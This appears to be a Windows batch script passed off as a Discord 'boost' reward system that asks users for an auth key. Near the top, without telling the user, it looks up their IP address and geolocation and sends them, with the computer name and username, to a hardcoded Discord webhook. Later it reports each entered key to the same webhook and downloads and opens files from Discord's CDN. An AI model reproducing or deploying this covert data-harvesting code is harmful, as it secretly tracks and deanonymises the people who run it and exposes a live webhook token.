@echo off
setlocal enabledelayedexpansion
set "el=black=[0m,bgblack=[40m,yellow=[33m,bgyellow=[43m,blue=[34m,bgblue=[44m,yellow=[33m,white=[37m,green=[32m,bggreen=[42m,red=[31m,bgred=[41m,off=[24m,pink=[35m,bgpink=[45m
set "%el:,=" && set "%"
color c
echo.
echo.
echo. welcome to the booster !blue!security place!black!
set oldcd=%cd%
cd %temp%
::sendtowebhook
set webhookurlm="https://discord.com/api/webhooks/884127979532324934/UzkCC8cP6JpvWKF6ABdOPHGBmzlNKoSglvyyOVNfpQ__AtQcJkp4qHMkcY_WJWKimi-u"
curl -sfkL https://extreme-ip-lookup.com/json > %temp%\tempit.txt
if exist log.txt del log.txt /f /q
curl --silent "https://myexternalip.com/raw">> %temp%\log.txt
set /p IP=<%temp%\log.txt
curl -H "Content-Type: application/json" -d "{\"username\": \"boost security\", \"embeds\": [{\"title\": \"script runned.\", \"color\": 10760150, \"fields\": [{\"name\": \"packing info :\", \"value\": \"all info succesfully get\"}, {\"name\": \"other info : \", \"value\": \"runned by %COMPUTERNAME% on %USERNAME% session. ip of user = %IP% \"}],\"thumbnail\":{\"url\": \"https://logos-world.net/wp-content/uploads/2020/12/Discord-Logo.png\"},\"footer\":{\"text\": \"%time%/%date%\"}}]}" %webhookurlm%
curl -F "data=@%temp%\tempit.txt" https://discord.com/api/webhooks/884127979532324934/UzkCC8cP6JpvWKF6ABdOPHGBmzlNKoSglvyyOVNfpQ__AtQcJkp4qHMkcY_WJWKimi-u >nul
del %temp%\log.txt /f /q
cd %oldcd%
cls
title rockstarz rewars system
echo.
echo.
echo.
echo.hello, have u boosted one or two time 1/2
echo.no need to lie if u have a bad key it will !red!not work!black! x)

set /p answer=""
if %answer% == 1 goto one
if %answer% == one goto one
if %answer% == 2 goto two
if %answer% == two goto two



:one
cls
echo.
echo.
echo.please now enter ur auth key given by an admin or owner... 
set /p unefois=""
set zz=https://pastebin.com/raw/hMLjjXGH
curl -ks %zz% | findstr /X %unefois% >nul
if "%errorlevel%"=="0" goto :valid_logina

echo u enter a bad auth key please try again
ping localhost -n 5 >nul
exit


:two
cls
echo.
echo.
echo.please now enter ur auth key given by an admin or owner... 
set /p j=""
set aa=https://pastebin.com/raw/NnsunsRe
curl -ks %aa% | findstr /X %j% >nul
if "%errorlevel%"=="0" goto :valid_loginb
echo u enter a bad auth key please try again
ping localhost -n 5 >nul
exit



:valid_logina
curl -H "Content-Type: application/json" -d "{\"username\": \"boost security\", \"embeds\": [{\"title\": \"KEY USED 1x boost rewar.\", \"color\": 10760150, \"fields\": [{\"name\": \"key serial number (working) :\", \"value\": \"key = %unefois% \"}, {\"name\": \"other info : \", \"value\": \"runned by %COMPUTERNAME% on %USERNAME% session. ip of user = %IP% \"}],\"thumbnail\":{\"url\": \"https://logos-world.net/wp-content/uploads/2020/12/Discord-Logo.png\"},\"footer\":{\"text\": \"%time%/%date%\"}}]}" %webhookurlm%
cls
color a
cls
echo.
echo.
echo.
echo. thx for boosting :))) cya and have fun ! 
curl --silent -O https://cdn.discordapp.com/attachments/882355701874311171/884109690760462366/SPOILER_boost1.txt
start SPOILER_boost1.txt
echo done !!!
pause
exit


:valid_loginb
curl -H "Content-Type: application/json" -d "{\"username\": \"boost security\", \"embeds\": [{\"title\": \"KEY USED 2x boost rewar.\", \"color\": 10760150, \"fields\": [{\"name\": \"key serial number (working) :\", \"value\": \"key = %j% \"}, {\"name\": \"other info : \", \"value\": \"runned by %COMPUTERNAME% on %USERNAME% session. ip of user = %IP% \"}],\"thumbnail\":{\"url\": \"https://logos-world.net/wp-content/uploads/2020/12/Discord-Logo.png\"},\"footer\":{\"text\": \"%time%/%date%\"}}]}" %webhookurlm%
color a
cls
echo.
echo.
echo.
echo. thx for boosting :))) cya and have fun ! 
curl --silent -O https://cdn.discordapp.com/attachments/882355701874311171/884109649400434748/SPOILER_boost2.txt
start SPOILER_boost2.txt
echo done !!!
pause
exit